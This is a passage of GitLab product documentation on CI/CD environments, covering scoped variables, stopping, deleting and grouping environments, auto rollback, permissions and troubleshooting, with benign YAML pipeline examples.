## CI/CD variables [Permalink](https://docs.gitlab.com/ci/environments/\#cicd-variables "Permalink")

To customize your environments and deployments, you can use any of the
[predefined CI/CD variables](https://docs.gitlab.com/ci/variables/predefined_variables/),
and define custom CI/CD variables.

### Limit the environment scope of a CI/CD variable [Permalink](https://docs.gitlab.com/ci/environments/\#limit-the-environment-scope-of-a-cicd-variable "Permalink")

By default, all [CI/CD variables](https://docs.gitlab.com/ci/variables/) are available to all jobs in a pipeline.
If a test tool in a job becomes compromised, the tool could attempt to retrieve all
CI/CD variables available to the job. To help mitigate this kind of supply chain attack,
you should limit the environment scope of sensitive variables to only the jobs that require them.

Limit the environment scope of a CI/CD variable by defining which environments it
can be available for. The default environment scope is the `*` wildcard, so any job
can access the variable.

You can use specific matching to select a particular environment. For example, set
the variable’s environment scope to `production` to only allow jobs with an [environment](https://docs.gitlab.com/ci/yaml/#environment)
of `production` to access the variable.

You can also use wildcard matching ( `*`) to select a particular environment group,
like all [review apps](https://docs.gitlab.com/ci/review_apps/) with `review/*`.

For example, with these four environments:

- `production`
- `staging`
- `review/feature-1`
- `review/feature-2`

These environment scopes match as follows:

| ↓ Scope / Environment → | `production` | `staging` | `review/feature-1` | `review/feature-2` |
| --- | --- | --- | --- | --- |
| `*` | Match | Match | Match | Match |
| `production` | Match |  |  |  |
| `staging` |  | Match |  |  |
| `review/*` |  |  | Match | Match |
| `review/feature-1` |  |  | Match |  |

|
|

You should not use environment-scoped variables with [`rules`](https://docs.gitlab.com/ci/yaml/#rules)
or [`include`](https://docs.gitlab.com/ci/yaml/#include). The variables might not be defined when
GitLab validates the pipeline configuration at pipeline creation.

## Search environments [Permalink](https://docs.gitlab.com/ci/environments/\#search-environments "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/10754) in GitLab 15.5.
- [Searching environments within a folder](https://gitlab.com/gitlab-org/gitlab/-/issues/373850) was introduced in GitLab 15.7 with [Feature flag `enable_environments_search_within_folder`](https://gitlab.com/gitlab-org/gitlab/-/issues/382108). Enabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/382108) in GitLab 17.4. Feature flag `enable_environments_search_within_folder` removed.

To search environments by name:

1. On the left sidebar, select **Search or go to** and find your project.
2. Select **Operate > Environments**.
3. In the search bar, enter your search term.
   - The length of your **search term should be 3 or more characters**.
   - Matching applies from the beginning of the environment name.
     - For example, `devel` matches the environment name `development`, but `elop` does not.
   - For environments with a folder name format, matching applies after the base folder name.
     - For example when the name is `review/test-app`, search term `test` matches `review/test-app`.
     - Also searching with the folder name prefixed like `review/test` matches `review/test-app`.

## Group similar environments [Permalink](https://docs.gitlab.com/ci/environments/\#group-similar-environments "Permalink")

You can group environments into collapsible sections in the UI.

For example, if all of your environments start with the name `review`,
then in the UI, the environments are grouped under that heading:

[![Environment groups](https://docs.gitlab.com/ci/environments/img/environments_dynamic_groups_v13_10.png)](https://docs.gitlab.com/ci/environments/img/environments_dynamic_groups_v13_10.png)

The following example shows how to start your environment names with `review`.
The `$CI_COMMIT_REF_SLUG` variable is populated with the branch name at runtime:

YAML Copy to clipboard

```yaml
deploy_review:
  stage: deploy
  script:
    - echo "Deploy a review app"
  environment:
    name: review/$CI_COMMIT_REF_SLUG
```

## Stopping an environment [Permalink](https://docs.gitlab.com/ci/environments/\#stopping-an-environment "Permalink")

Stopping an environment means its deployments are not accessible on the target server. You must stop
an environment before it can be deleted.

When using the `on_stop` action to stop an environment, the job runs if it’s not [archived](https://docs.gitlab.com/administration/settings/continuous_integration/#archive-pipelines).

### Stop an environment by using the UI [Permalink](https://docs.gitlab.com/ci/environments/\#stop-an-environment-by-using-the-ui "Permalink")

To trigger an `on_stop` action and manually stop an environment from the
Environments view, the stop and deploy jobs must be in the same
[`resource_group`](https://docs.gitlab.com/ci/yaml/#resource_group).

To stop an environment in the GitLab UI:

1. On the left sidebar, select **Search or go to** and find your project.
2. Select **Operate > Environments**.
3. Next to the environment you want to stop, select **Stop**.
4. On the confirmation dialog, select **Stop environment**.

### Default stopping behavior [Permalink](https://docs.gitlab.com/ci/environments/\#default-stopping-behavior "Permalink")

GitLab automatically stops environments when the associated branch is deleted or merged.
This behavior persists even if no explicit `on_stop` CI/CD job is defined.

However, [issue 428625](https://gitlab.com/gitlab-org/gitlab/-/issues/428625) proposes to change this behavior
so that production and staging environments stop only if an explicit `on_stop` CI/CD job is defined.

You can configure an environment’s stopping behavior with the
[`auto_stop_setting`](https://docs.gitlab.com/api/environments/#update-an-existing-environment)
parameter in the Environments API.

### Stop an environment when a branch is deleted [Permalink](https://docs.gitlab.com/ci/environments/\#stop-an-environment-when-a-branch-is-deleted "Permalink")

You can configure environments to stop when a branch is deleted.

In the following example, a `deploy_review` job calls a `stop_review` job to clean up and stop the
environment.

- Both jobs must have the same [`rules`](https://docs.gitlab.com/ci/yaml/#rules)
or [`only/except`](https://docs.gitlab.com/ci/yaml/deprecated_keywords/#only--except) configuration. Otherwise,
the `stop_review` job might not be included in all pipelines that include the
`deploy_review` job, and you cannot trigger `action: stop` to stop the environment automatically.
- The job with [`action: stop` might not run](https://docs.gitlab.com/ci/environments/#the-job-with-action-stop-doesnt-run)
if it’s in a later stage than the job that started the environment.
- If you can’t use [merge request pipelines](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/),
set [`GIT_STRATEGY`](https://docs.gitlab.com/ci/runners/configure_runners/#git-strategy) to `none` or `empty`
in the `stop_review` job. Then, the [runner](https://docs.gitlab.com/runner/) doesn’t
try to check out the code after the branch is deleted.

YAML Copy to clipboard

```yaml
deploy_review:
  stage: deploy
  script:
    - echo "Deploy a review app"
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    url: https://$CI_ENVIRONMENT_SLUG.example.com
    on_stop: stop_review

stop_review:
  stage: deploy
  script:
    - echo "Remove review app"
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    action: stop
  when: manual
```

### Stop an environment when a merge request is merged or closed [Permalink](https://docs.gitlab.com/ci/environments/\#stop-an-environment-when-a-merge-request-is-merged-or-closed "Permalink")

When you use the [merge request pipelines](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/) configuration,
the `stop` trigger is automatically enabled.

In the following example, the `deploy_review` job calls a `stop_review` job to clean up and stop
the environment.

- When the [**Pipelines must succeed**](https://docs.gitlab.com/user/project/merge_requests/auto_merge/#require-a-successful-pipeline-for-merge) setting is turned on,
you can configure the [`allow_failure: true`](https://docs.gitlab.com/ci/yaml/#allow_failure)
keyword on the `stop_review` job to prevent it from
blocking your pipelines and merge requests.

YAML Copy to clipboard

```yaml
deploy_review:
  stage: deploy
  script:
    - echo "Deploy a review app"
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    on_stop: stop_review
  rules:
    - if: $CI_MERGE_REQUEST_ID

stop_review:
  stage: deploy
  script:
    - echo "Remove review app"
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    action: stop
  rules:
    - if: $CI_MERGE_REQUEST_ID
      when: manual
```

When using this functionality together with merge trains, the `stop` job triggers only if [duplicate pipelines are avoided](https://docs.gitlab.com/ci/jobs/job_rules/#avoid-duplicate-pipelines).

### Stop an environment after a certain time period [Permalink](https://docs.gitlab.com/ci/environments/\#stop-an-environment-after-a-certain-time-period "Permalink")

You can set an environment to stop automatically after a certain time period.

Due to resource limitations, a background worker for stopping environments runs only once every
hour. This means that environments may not be stopped after the exact time period specified, but are
instead stopped when the background worker detects expired environments.

In your `.gitlab-ci.yml` file, specify the [`environment:auto_stop_in`](https://docs.gitlab.com/ci/yaml/#environmentauto_stop_in)
keyword. Specify the time period in natural language, such as `1 hour and 30 minutes` or `1 day`.
After the time period passes, GitLab automatically triggers a job to stop the environment.

In the following example:

- Each commit on a merge request triggers a `review_app` job that deploys the latest change to the
environment and resets its expiry period.
- If the environment is inactive for more than a week, GitLab automatically triggers the
`stop_review_app` job to stop the environment.

YAML Copy to clipboard

```yaml
review_app:
  script: deploy-review-app
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    on_stop: stop_review_app
    auto_stop_in: 1 week
  rules:
    - if: $CI_MERGE_REQUEST_ID

stop_review_app:
  script: stop-review-app
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    action: stop
  rules:
    - if: $CI_MERGE_REQUEST_ID
      when: manual
```

The [`environment:action`](https://docs.gitlab.com/ci/yaml/#environmentaction) keyword can be used to reset the time
that an environment is scheduled to stop. For more information, see
[Access an environment for preparation or verification purposes](https://docs.gitlab.com/ci/environments/#access-an-environment-for-preparation-or-verification-purposes).

#### View an environment’s scheduled stop date and time [Permalink](https://docs.gitlab.com/ci/environments/\#view-an-environments-scheduled-stop-date-and-time "Permalink")

When a environment has been [scheduled to stop after a specified time period](https://docs.gitlab.com/ci/environments/#stop-an-environment-after-a-certain-time-period),
you can view its expiration date and time.

To view an environment’s expiration date and time:

1. On the left sidebar, select **Search or go to** and find your project.
2. Select **Operate > Environments**.
3. Select the name of the environment.

The expiration date and time is displayed in the upper-left corner, next to the environment’s name.

#### Override an environment’s scheduled stop date and time [Permalink](https://docs.gitlab.com/ci/environments/\#override-an-environments-scheduled-stop-date-and-time "Permalink")

When a environment has been [scheduled to stop after a specified time period](https://docs.gitlab.com/ci/environments/#stop-an-environment-after-a-certain-time-period),
you can override its expiration.

To override an environment’s expiration in the UI:

1. On the left sidebar, select **Search or go to** and find your project.
2. Select **Operate > Environments**.
3. Select the environment name.
4. in the upper-right corner, select the thumbtack (
thumbtack).

To override an environment’s expiration in the `.gitlab-ci.yml`:

1. Open the project’s `.gitlab-ci.yml`.
2. Update the `auto_stop_in` setting of the corresponding deploy job to `auto_stop_in: never`.

The `auto_stop_in` setting is overridden and the environment remains active until it’s stopped
manually.

### Clean up stale environments [Permalink](https://docs.gitlab.com/ci/environments/\#clean-up-stale-environments "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/108616) in GitLab 15.8 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `stop_stale_environments`. Disabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/112098) in GitLab 15.10. Feature flag `stop_stale_environments` removed.

Clean up stale environments when you want to stop old environments in a project.

Prerequisites:

- You must have at least the Maintainer role.

To clean up stale environments:

1. On the left sidebar, select **Search or go to** and find your project.
2. Select **Operate > Environments**.
3. Select **Clean up environments**.
4. Select the date to use for determining which environments to consider stale.
5. Select **Clean up**.

Active environments that haven’t been updated after the specified date are stopped.
Protected environments are ignored and not stopped.

### Run a pipeline job when environment is stopped [Permalink](https://docs.gitlab.com/ci/environments/\#run-a-pipeline-job-when-environment-is-stopped "Permalink")

History

- Feature flag `environment_stop_actions_include_all_finished_deployments` [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/435128) in GitLab 16.9. Disabled by default.
- Feature flag `environment_stop_actions_include_all_finished_deployments` [removed](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/150932) in GitLab 17.0.

You can define a stop job for the environment with an [`on_stop` action](https://docs.gitlab.com/ci/yaml/#environmenton_stop) in the environment’s deploy job.

The stop jobs of finished deployments in the latest finished pipeline are run when an environment is stopped. A deployment or pipeline is finished if it has the successful, canceled, or failed status.

Prerequisites:

- Both the deploy and stop jobs must have the same rules or only/except configuration.
- The stop job must have the following keywords defined:
  - `when`, defined at either:
    - [The job level](https://docs.gitlab.com/ci/yaml/#when).
    - [In a rules clause](https://docs.gitlab.com/ci/yaml/#rules). If you use `rules` and `when: manual`, you should
      also set [`allow_failure: true`](https://docs.gitlab.com/ci/yaml/#allow_failure) so the pipeline can complete
      even if the job doesn’t run.
  - `environment:name`
  - `environment:action`

In the following example:

- A `review_app` job calls a `stop_review_app` job after the first job is finished.
- The `stop_review_app` is triggered based on what is defined under `when`. In this
case, it is set to `manual`, so it needs a
[manual action](https://docs.gitlab.com/ci/jobs/job_control/#create-a-job-that-must-be-run-manually)
from the GitLab UI to run.
- The `GIT_STRATEGY` is set to `none`. If the `stop_review_app` job is
[automatically triggered](https://docs.gitlab.com/ci/environments/#stopping-an-environment),
the runner doesn’t try to check out the code after the branch is deleted.

YAML Copy to clipboard

```yaml
review_app:
  stage: deploy
  script: make deploy-app
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    url: https://$CI_ENVIRONMENT_SLUG.example.com
    on_stop: stop_review_app

stop_review_app:
  stage: deploy
  variables:
    GIT_STRATEGY: none
  script: make delete-app
  when: manual
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    action: stop
```

### Multiple stop actions for an environment [Permalink](https://docs.gitlab.com/ci/environments/\#multiple-stop-actions-for-an-environment "Permalink")

History

- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/358911) in GitLab 15.0. [Feature flag `environment_multiple_stop_actions`](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/86685) removed.

To configure multiple **parallel** stop actions on an environment, specify the
[`on_stop`](https://docs.gitlab.com/ci/yaml/#environmenton_stop) keyword across multiple
[deployment jobs](https://docs.gitlab.com/ci/jobs/#deployment-jobs) for the same `environment`, as defined in the
`.gitlab-ci.yml` file.

When an environment is stopped, the matching `on_stop` actions from only successful deployment jobs are run in parallel, in no particular order.

All `on_stop` actions for an environment must belong to the same pipeline. To use multiple `on_stop` actions in
[downstream pipelines](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/), you must configure the environment actions in
the parent pipeline. For more information, see [downstream pipelines for deployments](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#advanced-example).

In the following example, for the `test` environment there are two deployment jobs:

- `deploy-to-cloud-a`
- `deploy-to-cloud-b`

When the environment is stopped, the system runs `on_stop` actions `teardown-cloud-a` and
`teardown-cloud-b` in parallel.

YAML Copy to clipboard

```yaml
deploy-to-cloud-a:
  script: echo "Deploy to cloud a"
  environment:
    name: test
    on_stop: teardown-cloud-a

deploy-to-cloud-b:
  script: echo "Deploy to cloud b"
  environment:
    name: test
    on_stop: teardown-cloud-b

teardown-cloud-a:
  script: echo "Delete the resources in cloud a"
  environment:
    name: test
    action: stop
  when: manual

teardown-cloud-b:
  script: echo "Delete the resources in cloud b"
  environment:
    name: test
    action: stop
  when: manual
```

### Stop an environment without running the `on_stop` action [Permalink](https://docs.gitlab.com/ci/environments/\#stop-an-environment-without-running-the-on_stop-action "Permalink")

There may be times when you want to stop an environment without running the defined
[`on_stop`](https://docs.gitlab.com/ci/yaml/#environmenton_stop) action. For example, you want to delete many
environments without using [compute quota](https://docs.gitlab.com/ci/pipelines/compute_minutes/).

To stop an environment without running the defined `on_stop` action, execute the
[Stop an environment API](https://docs.gitlab.com/api/environments/#stop-an-environment) with the parameter
`force=true`.

### Delete an environment [Permalink](https://docs.gitlab.com/ci/environments/\#delete-an-environment "Permalink")

Delete an environment when you want to remove it and all its deployments.

Prerequisites:

- You must have at least the Developer role.
- You must [stop](https://docs.gitlab.com/ci/environments/#stopping-an-environment) the environment before it can be deleted.

To delete an environment:

1. On the left sidebar, select **Search or go to** and find your project.
2. Select **Operate > Environments**.
3. Select the **Stopped** tab.
4. Next to the environment you want to delete, select **Delete environment**.
5. On the confirmation dialog, select **Delete environment**.

## Access an environment for preparation or verification purposes [Permalink](https://docs.gitlab.com/ci/environments/\#access-an-environment-for-preparation-or-verification-purposes "Permalink")

History

- [Updated](https://gitlab.com/gitlab-org/gitlab/-/issues/437133) to reset `auto_stop_in` for `prepare` and `access` actions in GitLab 17.7.

You can define a job that accesses an environment for various purposes, such as verification or preparation. This
effectively bypasses deployment creation, so that you can adjust your CD workflow more accurately.

To do so, add either `action: prepare`, `action: verify`, or `action: access` to the `environment` section of your job:

YAML Copy to clipboard

```yaml
build:
  stage: build
  script:
    - echo "Building the app"
  environment:
    name: staging
    action: prepare
    url: https://staging.example.com
```

This gives you access to environment-scoped variables, and can be used to protect builds from unauthorized access. Also,
it’s effective to avoid the [prevent outdated deployment jobs](https://docs.gitlab.com/ci/environments/deployment_safety/#prevent-outdated-deployment-jobs) feature.

If an environment is configured to stop after a certain time period, jobs with the `access` or `prepare`
action will reset the scheduled stop time. The [`environment:auto_stop_in`](https://docs.gitlab.com/ci/yaml/#environmentauto_stop_in)
from the most recent successful deployment job to the environment is used when resetting the scheduled time.
For example, if the most recent deployment used `auto_stop_in: 1 week` and is later accessed by a job with
`action: access`, the environment will be rescheduled to stop one week from the completion of the accessing job.

To access an environment without changing the scheduled stop time, use the `verify` action.

## Environment incident management [Permalink](https://docs.gitlab.com/ci/environments/\#environment-incident-management "Permalink")

Production environments can go down unexpectedly, including for reasons outside
of your control. For example, issues with external dependencies, infrastructure,
or human error can cause major issues with an environment. Things like:

- A dependent cloud service goes down.
- A 3rd party library is updated and it’s not compatible with your application.
- Someone performs a DDoS attack to a vulnerable endpoint in your server.
- An operator misconfigures infrastructure.
- A bug is introduced into the production application code.

You can use [incident management](https://docs.gitlab.com/operations/incident_management/)
to get alerts when there are critical issues that need immediate attention.

### View the latest alerts for environments [Permalink](https://docs.gitlab.com/ci/environments/\#view-the-latest-alerts-for-environments "Permalink")

- Tier: Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

If you [set up an alert integration](https://docs.gitlab.com/operations/incident_management/integrations/#configuration),
alerts for environments are shown on the environments page. The alert with the highest
severity is shown, so you can identify which environments need immediate attention.

[![Environment alert](https://docs.gitlab.com/ci/environments/img/alert_for_environment_v13_4.png)](https://docs.gitlab.com/ci/environments/img/alert_for_environment_v13_4.png)

When the issue that triggered the alert is resolved, it is removed and is no
longer visible on the environments page.

If the alert requires a [rollback](https://docs.gitlab.com/ci/environments/deployments/#retry-or-roll-back-a-deployment), you can select the
deployment tab from the environment page and select which deployment to roll back to.

### Auto Rollback [Permalink](https://docs.gitlab.com/ci/environments/\#auto-rollback "Permalink")

- Tier: Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

In a typical Continuous Deployment workflow, the CI pipeline tests every commit before deploying to
production. However, problematic code can still make it to production. For example, inefficient code
that is logically correct can pass tests even though it causes severe performance degradation.
Operators and SREs monitor the system to catch these problems as soon as possible. If they find a
problematic deployment, they can roll back to a previous stable version.

GitLab Auto Rollback eases this workflow by automatically triggering a rollback when a
[critical alert](https://docs.gitlab.com/operations/incident_management/alerts/)
is detected.
For GitLab to select the appropriate environment for the rollback, the alert should contain a `gitlab_environment_name` key with the name of the environment.
GitLab selects and redeploys the most recent successful deployment.

Limitations of GitLab Auto Rollback:

- The rollback is skipped if a deployment is running when the alert is detected.
- A rollback can happen only once in three minutes. If multiple alerts are detected at once, only
one rollback is performed.

GitLab Auto Rollback is turned off by default. To turn it on:

1. On the left sidebar, select **Search or go to** and find your project.
2. Select **Settings > CI/CD**.
3. Expand **Automatic deployment rollbacks**.
4. Select the checkbox for **Enable automatic rollbacks**.
5. Select **Save changes**.

## Environment permissions [Permalink](https://docs.gitlab.com/ci/environments/\#environment-permissions "Permalink")

Depending on your role, you can interact with environments in public
and private projects.

### View environments [Permalink](https://docs.gitlab.com/ci/environments/\#view-environments "Permalink")

- In public projects, anyone can view a list of environments, including non-members.
- In private projects, you must have at least the Reporter role to view a list of environments.

### Create and update environments [Permalink](https://docs.gitlab.com/ci/environments/\#create-and-update-environments "Permalink")

- You must have at least the Developer role to create a new environment, or update an existing unprotected environment.
- If an existing environment is protected and you don’t have access to it, you cannot update the environment.

### Stop and delete environments [Permalink](https://docs.gitlab.com/ci/environments/\#stop-and-delete-environments "Permalink")

- You must have at least the Developer role to stop or delete an unprotected environment.
- If an environment is protected and you don’t have access to it, you cannot stop or delete the environment.

### Run deployment jobs in protected environments [Permalink](https://docs.gitlab.com/ci/environments/\#run-deployment-jobs-in-protected-environments "Permalink")

If you can push or merge to the protected branch:

- You must have at least the Reporter role.

If you can’t push to the protected branch:

- You must be a part of a group with the Reporter role.

See [Deployment-only access to protected environments](https://docs.gitlab.com/ci/environments/protected_environments/#deployment-only-access-to-protected-environments).

## Web terminals (deprecated) [Permalink](https://docs.gitlab.com/ci/environments/\#web-terminals-deprecated "Permalink")

This feature was [deprecated](https://gitlab.com/groups/gitlab-org/configure/-/epics/8) in GitLab 14.5.

If you deploy to your environments with the help of a deployment service (for example,
the [Kubernetes integration](https://docs.gitlab.com/user/infrastructure/clusters/)), GitLab can open
a terminal session to your environment. You can then debug issues without leaving your web browser.

The Web terminal is a container-based deployment, which often lacks basic tools (like an editor),
and can be stopped or restarted at any time. If this happens, you lose all your
changes. Treat the Web terminal as a debugging tool, not a comprehensive online IDE.

Web terminals:

- Are available to project Maintainers and Owners only.
- Must [be enabled](https://docs.gitlab.com/administration/integration/terminal/).

In the UI, to view the Web terminal, either:

- From the **Actions** menu, select **Terminal**:

[![Terminal button on environment index](https://docs.gitlab.com/ci/environments/img/environments_terminal_button_on_index_v14_3.png)](https://docs.gitlab.com/ci/environments/img/environments_terminal_button_on_index_v14_3.png)

- On the page for a specific environment, on the right, select **Terminal** (
terminal).


Select the button to establish the terminal session.
It works like any other terminal. You’re in the container created
by your deployment so you can:

- Run shell commands and get responses in real time.
- Check the logs.
- Try out configuration or code tweaks.

You can open multiple terminals to the same environment. They each get their own shell
session and even a multiplexer like `screen` or `tmux`.

## Related topics [Permalink](https://docs.gitlab.com/ci/environments/\#related-topics "Permalink")

- [Dashboard for Kubernetes](https://docs.gitlab.com/ci/environments/kubernetes_dashboard/)
- [Deployments](https://docs.gitlab.com/ci/environments/deployments/)
- [Protected environments](https://docs.gitlab.com/ci/environments/protected_environments/)
- [Environments Dashboard](https://docs.gitlab.com/ci/environments/environments_dashboard/)
- [Deployment safety](https://docs.gitlab.com/ci/environments/deployment_safety/#restrict-write-access-to-a-critical-environment)

## Troubleshooting [Permalink](https://docs.gitlab.com/ci/environments/\#troubleshooting "Permalink")

### The job with `action: stop` doesn’t run [Permalink](https://docs.gitlab.com/ci/environments/\#the-job-with-action-stop-doesnt-run "Permalink")

In some cases, environments do not stop despite an `on_stop` job being configured. This happens when the job
with the `action: stop` is not in a runnable state due to its `stages:` or `needs:` configuration.

For example:

- The environment might start in a stage that also has a job that failed.
Then the jobs in later stages job don’t start. If the job with the `action: stop`
for the environment is also in a later stage, it can’t start and the environment isn’t deleted.
- The job with the `action: stop` might have a dependency on a job that has not yet completed.

To ensure the `action: stop` can always run when needed, you can:

- Put both jobs in the same stage:



YAML Copy to clipboard





```yaml
stages:
  - build
  - test
  - deploy

...

deploy_review:
stage: deploy
environment:
    name: review/$CI_COMMIT_REF_SLUG
    url: https://$CI_ENVIRONMENT_SLUG.example.com
    on_stop: stop_review

stop_review:
stage: deploy
environment:
    name: review/$CI_COMMIT_REF_SLUG
    action: stop
when: manual
```

- Add a [`needs`](https://docs.gitlab.com/ci/yaml/#needs) entry to the `action: stop` job so the
job can start out of stage order:



YAML Copy to clipboard





```yaml
stages:
  - build
  - test
  - deploy
  - cleanup

...

deploy_review:
stage: deploy
environment:
    name: review/$CI_COMMIT_REF_SLUG
    url: https://$CI_ENVIRONMENT_SLUG.example.com
    on_stop: stop_review

stop_review:
stage: cleanup
needs:
    - deploy_review
environment:
    name: review/$CI_COMMIT_REF_SLUG
    action: stop
when: manual
```

### Error: job would create an environment with an invalid parameter [Permalink](https://docs.gitlab.com/ci/environments/\#error-job-would-create-an-environment-with-an-invalid-parameter "Permalink")

If your project is configured to [create a dynamic environment](https://docs.gitlab.com/ci/environments/#create-a-dynamic-environment),
you might encounter this error in a deployment job because the dynamically generated parameter can’t be used for creating an environment:

Copy to clipboard

```plaintext
This job could not be executed because it would create an environment with an invalid parameter.
```

For example, your project has the following `.gitlab-ci.yml`:

YAML Copy to clipboard

```yaml
deploy:
script: echo
environment: production/$ENVIRONMENT
```

Because the `$ENVIRONMENT` variable does not exist in the pipeline, GitLab tries to
create an environment with a name `production/`, which is invalid in
[the environment name constraint](https://docs.gitlab.com/ci/yaml/#environmentname).

To fix this, use one of the following solutions:

- Remove `environment` keyword from the deployment job. GitLab has already been
ignoring the invalid keyword, therefore your deployment pipelines stay intact
even after the keyword removal.
- Ensure the variable exists in the pipeline. Review the
[limitation on supported variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

#### If you get this error on review apps [Permalink](https://docs.gitlab.com/ci/environments/\#if-you-get-this-error-on-review-apps "Permalink")

For example, if you have the following in your `.gitlab-ci.yml`:

YAML Copy to clipboard

```yaml
review:
script: deploy review app
environment: review/$CI_COMMIT_REF_NAME
```

When you create a new merge request with a branch name `bug-fix!`,
the `review` job tries to create an environment with `review/bug-fix!`.
However, the `!` is an invalid character for environments, so the
deployment job fails because it was about to run without an environment.

To fix this, use one of the following solutions:

- Re-create your feature branch without the invalid characters,
such as `bug-fix`.

- Replace the `CI_COMMIT_REF_NAME` [predefined variable](https://docs.gitlab.com/ci/variables/predefined_variables/) with
`CI_COMMIT_REF_SLUG` which strips any invalid characters:



YAML Copy to clipboard





```yaml
review:
    script: deploy review app
    environment: review/$CI_COMMIT_REF_SLUG
```


## Help & feedback

[Edit this page](https://gitlab.com/gitlab-org/gitlab/-/blob/master/doc/ci/environments/_index.md)

[Suggest updates](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Documentation)

[Request support](https://about.gitlab.com/support/)

[View pricing](https://about.gitlab.com/pricing/)

[Try GitLab for free](https://about.gitlab.com/free-trial/)

[Post on the GitLab forum](https://forum.gitlab.com/new-topic?title=topic%20title&body=topic%20body&tags=docs-feedback)

![Company Logo](https://cdn.cookielaw.org/logos/aa14a5c8-79e3-442a-8177-464ad850b19d/e46c1d0d-1f66-481f-bc06-5427671431da/253e6fee-c4c0-4b60-bc35-79cdae5dda32/gitlab-logo-100.png)

## Privacy Preference Center

## Privacy Preference Center

- ### Your Privacy

- ### Strictly Necessary Cookies

- ### Functionality Cookies

- ### Performance and Analytics Cookies

- ### Targeting and Advertising Cookies

- ### Ad User Data

- ### Ad Personalization


#### Your Privacy

When you visit any website, it may store or retrieve information on your browser, mostly in the form of cookies. This information might be about you, your preferences or your device and is mostly used to make the site work as you expect it to. The information does not usually directly identify you, but it can give you a more personalized web experience. Because we respect your right to privacy, you can choose not to allow some types of cookies. Click on the different category headings to find out more and change our default settings. However, blocking some types of cookies may impact your experience of the site and the services we are able to offer.


[Cookie Policy](https://about.gitlab.com/privacy/cookies/)

User ID:  985922c0-ea51-4a44-a7e1-2b48d8a3d634

This User ID will be used as a unique identifier while storing and accessing your preferences for future.

Timestamp:  --

#### Strictly Necessary Cookies

Always Active

These cookies are necessary for the website to function and cannot be switched off in our systems. They are usually only set in response to actions made by you which amount to a request for services, such as setting your privacy preferences, enabling you to securely log into the site, filling in forms, or using the customer checkout. GitLab processes any personal data collected through these cookies on the basis of our legitimate interest.

Cookies Details‎

#### Functionality Cookies

Functionality Cookies

These cookies enable helpful but non-essential website functions that improve your website experience. By recognizing you when you return to our website, they may, for example, allow us to personalize our content for you or remember your preferences. If you do not allow these cookies then some or all of these services may not function properly. GitLab processes any personal data collected through these cookies on the basis of your consent

Cookies Details‎

#### Performance and Analytics Cookies

Performance and Analytics Cookies

These cookies allow us and our third-party service providers to recognize and count the number of visitors on our websites and to see how visitors move around our websites when they are using it. This helps us improve our products and ensures that users can easily find what they need on our websites. These cookies usually generate aggregate statistics that are not associated with an individual. To the extent any personal data is collected through these cookies, GitLab processes that data on the basis of your consent.

Cookies Details‎

#### Targeting and Advertising Cookies

Targeting and Advertising Cookies

These cookies enable different advertising related functions. They may allow us to record information about your visit to our websites, such as pages visited, links followed, and videos viewed so we can make our websites and the advertising displayed on it more relevant to your interests. They may be set through our website by our advertising partners. They may be used by those companies to build a profile of your interests and show you relevant advertisements on other websites. GitLab processes any personal data collected through these cookies on the basis of your consent.

Cookies Details‎

#### Ad User Data

Ad User Data

Sets consent for sending user data to Google for advertising purposes.

Cookies Details‎

#### Ad Personalization

Ad Personalization

Sets consent for personalized advertising.

Cookies Details‎

Back Button

### Cookie List

Filter Button

ConsentLeg.Interest

checkbox labellabel

checkbox labellabel

checkbox labellabel

Clear

checkbox labellabel

ApplyCancel

Confirm My Choices

Allow All

[![Powered by Onetrust](https://cdn.cookielaw.org/logos/static/powered_by_logo.svg)](https://www.onetrust.com/products/cookie-consent/)

---
